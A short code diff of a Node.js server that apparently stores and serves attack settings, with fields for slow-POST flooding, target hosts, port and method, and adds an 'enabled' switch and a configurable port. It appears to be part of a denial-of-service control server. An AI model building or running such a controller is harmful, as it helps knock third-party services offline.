@@ -43,7 +43,7 @@ app.post('/update/:id', async (req, res) => {
 
 db.batch()
 .put('reports', '{}')
-.put('config', '{"doTLS":true,"doSlowpost":true,"hosts":[""],"IP":"","port":443,"path":"/","method":"POST"}')
+.put('config', '{"enabled":false,"doTLS":true,"doSlowpost":true,"hosts":[""],"IP":"","port":443,"path":"/","method":"POST"}')
 .put('updates', '{}').write((err) => {
   if (err) return console.error('fatal: couldn\'t write to db');
 
@@ -60,7 +60,7 @@ db.batch()
     }
   })().catch(e => console.error(e)), 2000);
 
-  app.listen(8000, () => {
+  app.listen(process.env.NODE_PORT || 80, () => {
     console.log('init: listening');
   });
 });
